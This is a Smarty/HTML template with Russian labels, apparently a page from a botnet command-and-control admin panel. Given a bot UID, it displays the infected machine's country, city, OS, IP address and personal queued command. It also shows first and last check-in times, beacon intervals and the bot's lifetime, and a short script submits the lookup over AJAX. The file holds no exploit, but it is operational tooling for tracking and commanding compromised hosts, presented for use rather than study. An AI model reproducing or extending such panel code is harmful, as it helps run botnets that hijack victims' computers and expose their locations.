<form action="/admins/cmd_info_uid.html?window=1&amp;id={$admin->id}&amp;str={$Cur.str}" enctype="application/x-www-form-urlencoded" method="post" name="add_sub{$rand_name}" id="add_sub{$rand_name}" onsubmit="submit_{$rand_name}(); return false;">
{if $Cur.str eq ''}
<br />
UID: <input name="uid" type="text" style="width:90%;" />
<br /><br />
<input class=i4 type="button" name="submit" value="Готово" style="width:100%;" onclick="submit_{$rand_name}();">
{else}
<table cellspacing=1 cellpadding=0 style="width:100%;" class="t">
<tr class="bg1">
		<td style="width:40%">UID:</td>
		<td style="width:60%">{$bots->prefix}{$bots->uid}</td>
</tr>

<tr class="bg2">
		<td colspan="2">&nbsp;</td>
</tr>

<tr class="bg1">
		<td>Стана:</td>
		<td>{$bots->country}</td>
</tr>

<tr class="bg2">
		<td>Город:</td>
		<td>{$bots->city}</td>
</tr>

<tr class="bg1">
		<td colspan="2">&nbsp;</td>
</tr>

<tr class="bg2">
		<td>ОС:</td>
		<td>{$bots->os}</td>
</tr>

<tr class="bg1">
		<td colspan="2">&nbsp;</td>
</tr>

<tr class="bg2">
		<td>IP:</td>
		<td>{$bots->ip}</td>
</tr>

<tr class="bg1">
		<td colspan="2">&nbsp;</td>
</tr>

<tr class="bg2">
		<td>Личная команда:</td>
		<td>{if $bots->cmd eq ''}-{else}{$bots->cmd}{/if}</td>
</tr>

<tr class="bg1">
		<td colspan="2">&nbsp;</td>
</tr>

<tr class="bg2">
		<td>Первый отстук:</td>
		<td>{$bots->post_date}</td>
</tr>
<tr class="bg1">
		<td>Последний раз был:</td>
		<td>{$bots->last_date}</td>
</tr>
<tr class="bg1">
		<td colspan="2">&nbsp;</td>
</tr>
<tr class="bg2">
		<td>Минимальное время между отстуком:</td>
		<td>{$bots->min_post}</td>
</tr>
<tr class="bg1">
		<td>Максимальное время между отстуком:</td>
		<td>{$bots->max_post}</td>
</tr>
<tr class="bg2">
		<td colspan="2">&nbsp;</td>
</tr>
<tr class="bg1">
		<td>Время жизни бота:</td>
		<td>{$bots->live_time_bot}</td>
</tr>
</table>
{/if}
</form>

<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.forms['add_sub{$rand_name}'].parentNode.id.replace('_content', '');
document.getElementById(id_{$rand_name} + '_title').innerHTML = 'Инфо о боте  - {$admin->link}';

function submit_{$rand_name}(){ldelim}
hax(document.forms['add_sub{$rand_name}'].action,
	{ldelim}
		method: document.forms['add_sub{$rand_name}'].method,
		form: 'add_sub{$rand_name}',
		id: id_{$rand_name} + '_content',
		nohistory:true,
		nocache:true,
		destroy:true,
		rc:true
	{rdelim}
);
document.getElementById(id_{$rand_name} + '_content').innerHTML = '<br /><div align="center"><img src="/images/indicator.gif" title="Загрузка" alt="Загрузка" /></div>';
{rdelim}

</script>